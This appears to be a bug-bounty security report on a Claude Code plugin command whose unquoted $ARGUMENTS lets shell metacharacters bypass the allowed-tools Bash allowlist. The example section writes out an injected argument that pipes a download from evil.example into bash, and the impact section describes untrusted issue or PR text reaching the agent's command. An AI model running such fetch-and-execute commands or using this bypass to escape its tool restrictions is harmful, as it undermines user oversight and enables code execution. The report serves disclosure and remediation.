### Title
Unquoted `$ARGUMENTS` in `ralph-loop.md`'s bash block enables shell command injection that bypasses the `allowed-tools` Bash allowlist - ([File: plugins/ralph-wiggum/commands/ralph-loop.md])

### Summary
The `/ralph-loop` command's frontmatter restricts Bash execution to only the setup script via `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]`, but the command body interpolates `$ARGUMENTS` unquoted into a literal shell command line. Because the substitution happens at the shell level before any prefix-based allowlist check is meaningful, an argument containing shell metacharacters (`;`, `|`, `` ` ``, `$()`, `&&`) causes the shell to execute additional, arbitrary commands beyond the intended script — defeating the purpose of the `allowed-tools` restriction.

### Finding Description
`plugins/ralph-wiggum/commands/ralph-loop.md` declares: [1](#0-0) 

Specifically, `allowed-tools` is scoped to only permit `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)`, and the command executes:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
``` [2](#0-1) 

`$ARGUMENTS` is the raw, unquoted text supplied to the slash command (per the `argument-hint: "PROMPT [--max-iterations N] [--completion-promise TEXT]"` at line 3). Because it is not quoted (`"$ARGUMENTS"`), the shell that renders/executes this `!` bash block performs word-splitting and interprets any shell metacharacters embedded in it. The `allowed-tools` allowlist is a prefix pattern match against the resulting command string (`Bash(<script path>:*)`), and since the resulting shell line still textually *starts with* the allowed script path, the allowlist check is satisfied even though the shell will subsequently execute a second, arbitrary command after a `;`, `&&`, `|`, or via command substitution — none of which is the allowlisted script.

For example, if `$ARGUMENTS` is:
```
Fix bug; curl http://evil.example/x | bash
```
the executed line becomes:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" Fix bug; curl http://evil.example/x | bash
```
The shell runs the setup script with `Fix` and `bug` as prompt words, then separately executes `curl http://evil.example/x | bash` — a fully arbitrary command, entirely outside the `allowed-tools` allowlist's intended scope.

Nothing downstream mitigates this: `setup-ralph-loop.sh` itself does perform its own argument parsing safely (options are read via `case`/`shift`), but that parsing happens on the *already-shell-executed* remainder — the injected command has already run by the time the script would even see its arguments, because the shell interpreter processes the entire line (including the injected metacharacters) before invoking the script as a subprocess. [3](#0-2) 

### Impact Explanation
This is a command-execution / allowlist-bypass vulnerability: content that reaches `$ARGUMENTS` (attacker-influenced free text, e.g. text copied from an issue/PR/file that an agent or user pastes as the loop prompt) can execute arbitrary shell commands with the privileges of the Claude Code session, entirely bypassing the `allowed-tools` Bash restriction that was specifically designed to sandbox this command to a single script. This matches the "unauthorized command execution / permission-allowlist bypass" bounty category, since the whole purpose of `allowed-tools: Bash(<script>:*)` is to prevent exactly this class of unrestricted shell execution.

### Likelihood Explanation
No special privilege is required — any text passed as the `/ralph-loop` argument (including text that originates from untrusted repo content, PR/issue text, or other model-relayed content that ends up as the command argument) with common shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$()`) triggers the issue. This is deterministic and trivially repeatable every time such an argument is supplied.

### Recommendation
Quote `$ARGUMENTS` in the bash block to prevent shell reinterpretation, e.g.:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" "$ARGUMENTS"
```
This alone still allows the script to receive the whole string as one argument (breaking multi-arg parsing), so the more correct fix is to avoid free-form shell interpolation of `$ARGUMENTS` entirely — pass it via a properly quoted array/positional mechanism supported by Claude Code's command frontmatter, or have the script read the raw argument string from an environment variable / stdin rather than shell-interpolated positional arguments, so metacharacters are never evaluated by the shell.
